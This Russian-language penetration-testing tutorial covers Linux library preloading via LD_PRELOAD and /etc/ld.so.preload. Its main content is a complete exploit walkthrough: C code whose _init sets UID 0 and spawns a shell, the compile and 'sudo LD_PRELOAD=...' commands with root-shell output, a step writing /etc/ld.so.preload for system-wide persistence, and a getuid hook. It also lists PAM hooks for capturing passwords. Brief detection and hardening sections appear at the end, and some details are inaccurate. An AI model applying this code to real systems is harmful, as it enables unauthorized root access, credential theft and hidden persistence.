# Глобальный перехват вызовов в Linux: LD_PRELOAD и /etc/ld.so.preload

## Контекст и базовые понятия

`LD_PRELOAD` и `/etc/ld.so.preload` являются механизмами динамического линкера `ld.so` (или `ld-linux.so`), реализующими функционал предварительной загрузки разделяемых объектов (shared objects). В контексте тестирования на проникновение и пост-эксплуатации эти механизмы представляют собой критически важный вектор для перехвата системных вызовов, модификации поведения приложений и повышения привилегий.

Динамический линкер отвечает за разрешение символов (функций) во время выполнения программы. Когда исполняемый файл динамически связан с библиотеками (например, `libc`), линкер ищет определения функций в загруженных библиотеках. Механизм `LD_PRELOAD` позволяет пользователю указать список библиотек, которые должны быть загружены **до** всех остальных. Это создает приоритет поиска: если перехватываемая библиотека содержит функцию с тем же именем, что и в стандартной библиотеке (например, `fopen`, `connect`, `getuid`), линкер использует определение из первой загруженной библиотеки.

Различие между `LD_PRELOAD` и `/etc/ld.so.preload` фундаментально и обусловлено моделью безопасности Linux. `LD_PRELOAD` — это переменная окружения, которая действует только в контексте процесса, в котором она установлена. Однако для бинарных файлов с установленными битом пользователя (setuid) или группы (setgid) переменные окружения, включая `LD_PRELOAD`, игнорируются линкером для предотвращения эскалации привилегий через подмену системных библиотек. `/etc/ld.so.preload` — это глобальный конфигурационный файл, который читается линкером для всех процессов, включая setuid-бинарники. Доступ к `/etc/ld.so.preload` требует прав root, что делает его вектором уже после получения доступа к привилегированной учетной записи, но позволяющим закрепить этот доступ на уровне всей системы.

Путаница часто возникает между `LD_PRELOAD` и `LD_LIBRARY_PATH`. `LD_LIBRARY_PATH` управляет путем поиска библиотек, но не гарантирует порядок загрузки относительно системных библиотек в контексте приоритета символов так же агрессивно, как `LD_PRELOAD`. `LD_PRELOAD` специально предназначен для переопределения символов, тогда как `LD_LIBRARY_PATH` предназначен для указания местоположения библиотек, если они не найдены в стандартных путях.

| Характеристика | `LD_PRELOAD` | `/etc/ld.so.preload` |
| :--- | :--- | :--- |
| **Тип объекта** | Переменная окружения (Environment Variable) | Файл конфигурации (Text File) |
| **Область действия** | Текущий процесс и его дочерние процессы | Все процессы системы (глобально) |
| **Работа с SetUID/SetGID** | Игнорируется линкером (безопасность) | Работает (требует прав root для записи) |
| **Требования для эксплуатации** | Возможность записи в окружение процесса | Права root (или доступ на запись в `/etc`) |
| **Основное применение в атаке** | Локальная эскалация (через sudo/настройки) | Закрепление (Persistence) и глобальный перехват |
| **Синтаксис** | `export LD_PRELOAD=/path/to/lib.so` | Список путей, разделенных новой строкой |

Механизм перехвата опирается на динамическое разрешение символов (dynamic symbol resolution). При загрузке программы линкер заполняет таблицу импорта (PLT/GOT). Если функция уже определена в загруженной ранее библиотеке (`LD_PRELOAD`), адрес в GOT перезаписывается на адрес функции из перехватывающей библиотеки. Это позволяет внедрять код без изменения исходного бинарного файла или использования `ptrace`.

## Внутреннее устройство механизма динамического линкера

Архитектура перехвата через `ld.so` базируется на порядке загрузки разделяемых объектов и алгоритме разрешения символов. Понимание этого процесса необходимо для корректной реализации перехватывающей библиотеки и избежания ошибок сегментации (segfault) при вызове оригинальных функций.

### Порядок загрузки и разрешение символов

Динамический линкер загружает библиотеки в строгом порядке. Сначала загружаются библиотеки, указанные в `/etc/ld.so.preload`. Затем загружаются библиотеки, указанные в переменной окружения `LD_PRELOAD`. После этого линкер загружает зависимости самого исполняемого файла (указанные в секции `DT_NEEDED` ELF-заголовка) и системные библиотеки по умолчанию (например, `/lib/x86_64-linux-gnu/libc.so.6`).

Разрешение символов происходит при первом обращении к функции. Линкер ищет определение символа в загруженных библиотеках в порядке их загрузки. Поскольку библиотеки из `LD_PRELOAD` загружаются первыми, их символы имеют наивысший приоритет.

```text
[Исполняемый файл]
       │
       ▼
[Динамический линкер (ld.so)]
       │
       ├── 1. Загрузка из /etc/ld.so.preload (глобально)
       │       └── [lib_hook_global.so] (Символы: highest priority)
       │
       ├── 2. Загрузка из LD_PRELOAD (локально)
       │       └── [lib_hook_local.so] (Символы: high priority)
       │
       ├── 3. Зависимости ELF (DT_NEEDED)
       │       └── [libcurl.so]
       │
       └── 4. Системные библиотеки по умолчанию
               └── [libc.so.6] (Символы: default fallback)
```

### Структура перехватывающей библиотеки

Для успешного перехвата библиотека должна быть скомпилирована как разделяемый объект (shared object) с флагами `-fPIC` (position-independent code) и `-shared`. Ключевым аспектом является корректное получение адреса оригинальной функции. Поскольку мы переопределяем функцию, прямой рекурсивный вызов приведет к стекпереполнению. Необходимо использовать `dlsym` с дескриптором `RTLD_NEXT`, чтобы получить указатель на следующую по порядку загрузки реализацию функции.

Структура перехватывающей функции требует точного совпадения сигнатуры с оригиналом. Для `fopen` это означает использование typedef для определения типа функции-оригинала.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>

// Определение типа функции-оригинала
typedef FILE* (*fopen_t)(const char *pathname, const char *mode);

// Глобальная переменная для хранения указателя на оригинал
static fopen_t real_fopen = NULL;

// Переопределенная функция
FILE *fopen(const char *pathname, const char *mode) {
    // Ленивая инициализация указателя на оригинал
    if (!real_fopen) {
        // Получаем адрес следующей реализации fopen в цепочке загрузки
        real_fopen = (fopen_t)dlsym(RTLD_NEXT, "fopen");
    }
    
    // Логирование или модификация аргументов
    fprintf(stderr, "[HOOK] fopen called with: %s, %s\n", pathname, mode);
    
    // Вызов оригинальной функции
    return real_fopen(pathname, mode);
}
```

### Особенности работы с SetUID и безопасностью

Линкер `ld.so` содержит встроенные проверки безопасности. Если исполняемый файл имеет установленный бит setuid или setgid, линкер проверяет переменные окружения, связанные с загрузкой библиотек (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT` и др.). Если эти переменные установлены, линкер либо игнорирует их, либо сбрасывает привилегии процесса до реального UID/GID перед загрузкой библиотек, в зависимости от версии glibc и настроек безопасности (например, `secureexec` в sudoers).

Исключение составляет `/etc/ld.so.preload`. Поскольку этот файл находится в `/etc`, доступ к нему на запись имеют только root. Логика безопасности гласит: если злоумышленник уже имеет возможность записать в `/etc/ld.so.preload`, он уже обладает правами root, и дополнительные ограничения на `LD_PRELOAD` для setuid-бинарников становятся избыточными. Таким образом, `/etc/ld.so.preload` работает даже для setuid-программ (например, `/usr/bin/sudo` или `/usr/bin/passwd`), что делает его мощным инструментом для глобального перехвата аутентификации или выполнения команд.

### Артефакты компиляции и загрузки

Компиляция перехватывающей библиотеки требует линковки с `libdl` для доступа к функциям `dlopen`/`dlsym`.

```bash
# Компиляция перехватывающей библиотеки
gcc -fPIC -shared -o libhook.so hook.c -ldl

# Проверка зависимостей библиотеки
ldd libhook.so
# Вывод должен содержать libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2
```

При загрузке линкер использует системный вызов `mmap` для отображения библиотеки в память процесса. Если перехватываемая функция вызывается на этапе инициализации линкера (до загрузки `libc`), перехват может не сработать или привести к краху, так как необходимые структуры данных еще не инициализированы.

## Применение и работа с предметом

На практике использование `LD_PRELOAD` и `/etc/ld.so.preload` разделяется на два основных сценария: локальная эскалация привилегий (через уязвимые настройки sudo или cron) и глобальное закрепление (persistence) после получения root-доступа.

### Локальная эскалация через sudo

Частая ошибка конфигурации `sudoers` заключается в сохранении переменных окружения пользователя при выполнении команд от имени root. Если в `/etc/sudoers` присутствует директива `env_keep += LD_PRELOAD`, пользователь может передать свою библиотеку в контекст root.

Алгоритм эксплуатации:
1.  Анализ прав пользователя: `sudo -l`.
2.  Выявление разрешенных команд и сохраненных переменных окружения.
3.  Создание библиотеки, вызывающей `setuid(0)` и `setgid(0)`, а затем `system("/bin/sh")`.
4.  Выполнение разрешенной команды с подменой `LD_PRELOAD`.

Пример конфигурации sudoers, уязвимой к данной атаке:
```text
# /etc/sudoers
user ALL=(ALL:ALL) NOPASSWD: /usr/bin/find
Defaults        env_keep += "LD_PRELOAD"
```

Код библиотеки для эскалации должен сбросить переменную `LD_PRELOAD` внутри себя, чтобы избежать рекурсивной загрузки при вызове `system()`, и установить привилегии.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    // Сброс переменной, чтобы system() не попытался загрузить эту же библиотеку снова
    unsetenv("LD_PRELOAD");
    
    // Установка реальных и эффективных UID/GID на 0 (root)
    setuid(0);
    setgid(0);
    
    // Запуск оболочки
    system("/bin/sh");
}
```

Компиляция и эксплуатация:
```bash
gcc -fPIC -shared -nostartfiles -o shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so find / -name test
# Вывод: # id
# uid=0(root) gid=0(root)
```

### Глобальное закрепление через /etc/ld.so.preload

После получения root-доступа злоумышленник может создать файл `/etc/ld.so.preload`, указав в нем путь к своей библиотеке. Это приведет к загрузке библиотеки в **каждый** новый процесс, включая демоны, SSH-сессии и службы.

Типичные цели перехвата:
*   `pam_authenticate` / `pam_auth_conform`: перехват аутентификации для логирования паролей или обхода проверок.
*   `getuid` / `geteuid`: возврат 0 для всех процессов, имитируя root.
*   `accept` / `recv`: перехват сетевых соединений для кражи данных.
*   `fopen` / `read`: скрытие файлов или модификация конфигураций на лету.

Пример перехвата `getuid` для маскировки:
```c
#define _GNU_SOURCE
#include <unistd.h>
#include <dlfcn.h>

typedef int (*getuid_t)(void);
static getuid_t real_getuid = NULL;

int getuid(void) {
    if (!real_getuid) {
        real_getuid = (getuid_t)dlsym(RTLD_NEXT, "getuid");
    }
    // Всегда возвращаем 0, даже если процесс запущен от обычного пользователя
    return 0;
}
```

### Обнаружение и детекция

Для обнаружения использования `LD_PRELOAD` в процессе можно использовать утилиту `lsof` или чтение `/proc/<pid>/environ`.

```bash
# Проверка переменных окружения процесса
cat /proc/1234/environ | tr '\0' '\n' | grep LD_PRELOAD

# Проверка загруженных библиотек
lsof -p 1234 | grep .so
```

В `/etc/ld.so.preload` должны находиться только системные библиотеки. Любые нестандартные пути или библиотеки, не подписанные вендором, являются индикатором компрометации.

## Сквозной практический пример: Эскалация привилегий через уязвимый sudo

**Исходные условия:**
*   **Среда:** Linux-хост (Ubuntu 20.04/22.04).
*   **Роль:** Атакующий имеет доступ к учетной записи `user` с паролем.
*   **Уязвимость:** В `/etc/sudoers` для `user` разрешено выполнение `/usr/bin/find` от имени root без пароля, и переменная `LD_PRELOAD` сохраняется (`env_keep`).
*   **Инструменты:** `gcc`, текстовый редактор.

**Шаг 1: Анализ прав sudo**
Атакующий проверяет, какие команды он может выполнять от имени root и какие переменные окружения сохраняются.

```bash
user@target:~$ sudo -l
Matching Defaults entries for user on target:
    env_keep += "LD_PRELOAD"

User user may run the following commands on target:
    (ALL : ALL) NOPASSWD: /usr/bin/find
```
*Результат:* Подтверждено, что `LD_PRELOAD` сохраняется при выполнении `find`.

**Шаг 2: Создание перехватывающей библиотеки**
Создается файл `escalate.c`, который при загрузке устанавливает UID/GID в 0 и запускает оболочку.

```c
/* escalate.c */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    // Важно: сбросить LD_PRELOAD, чтобы system() не зациклился
    unsetenv("LD_PRELOAD");
    
    // Установка привилегий root
    setuid(0);
    setgid(0);
    
    // Запуск оболочки
    system("/bin/bash");
}
```

**Шаг 3: Компиляция библиотеки**
Библиотека должна быть скомпилирована как разделяемый объект без файлов старта (так как `_init` вызывается линкером автоматически).

```bash
user@target:~$ gcc -fPIC -shared -nostartfiles -o /tmp/escalate.so escalate.c
user@target:~$ ls -l /tmp/escalate.so
-rwxrwxr-x 1 user user 8432 Oct 26 10:00 /tmp/escalate.so
```

**Шаг 4: Эксплуатация через sudo**
Выполняется разрешенная команда `find` с подменой переменной окружения.

```bash
user@target:~$ sudo LD_PRELOAD=/tmp/escalate.so find / -name test
# Вывод оболочки:
# root@target:~# id
# uid=0(root) gid=0(root) groups=0(root)
```
*Результат:* Команда `find` запускается в контексте root, но до выполнения основной логики `find` линкер загружает `escalate.so`. Функция `_init` выполняется первой, устанавливая привилегии root и запуская `/bin/bash`. Атакующий получает root-shell.

**Шаг 5: Закрепление (Persistence)**
Для постоянного доступа атакующий копирует библиотеку в системный каталог и добавляет путь в `/etc/ld.so.preload`.

```bash
root@target:~# cp /tmp/escalate.so /usr/lib/libhook.so
root@target:~# echo "/usr/lib/libhook.so" > /etc/ld.so.preload
root@target:~# cat /etc/ld.so.preload
/usr/lib/libhook.so
```
*Результат:* Теперь любой новый процесс на системе будет загружать эту библиотеку. Если библиотека содержит перехват `getuid`, атакующий может получить root-shell даже без sudo, просто запустив любой бинарник.

**Ожидаемый вывод:**
Пример демонстрирует полный цикл эксплуатации: от анализа конфигурации до получения root-доступа и закрепления. Ключевым моментом является использование `unsetenv` внутри `_init` для предотвращения рекурсии при вызове `system()`, а также понимание того, что `sudo` с `env_keep` полностью отключает защиту линкера от подмены библиотек для setuid-процессов, инициированных через sudo.

## Аналитический вывод

Механизмы `LD_PRELOAD` и `/etc/ld.so.preload` представляют собой мощный вектор атак в Linux, основанный на доверии динамического линкера к порядку загрузки разделяемых объектов. `LD_PRELOAD` эффективен для локальной эскалации привилегий в случаях неправильной конфигурации `sudo` (сохранение переменных окружения) или уязвимостей в cron-задачах. `/etc/ld.so.preload` служит инструментом глобального закрепления, позволяя перехватывать системные вызовы на уровне всей системы, включая аутентификацию и сетевые соединения.

Защита от этих атак требует строгого контроля конфигурации `sudoers` (исключение `LD_PRELOAD` из `env_keep`), мониторинга целостности файла `/etc/ld.so.preload` и использования механизмов контроля исполнения (например, SELinux/AppArmor), которые могут ограничивать доступ к динамическому линкеру для непривилегированных процессов. В современных системах важно также учитывать, что многие службы теперь используют статическую линковку или безопасные режимы выполнения, что снижает поверхность атаки, но не устраняет ее полностью в legacy-инфраструктуре.
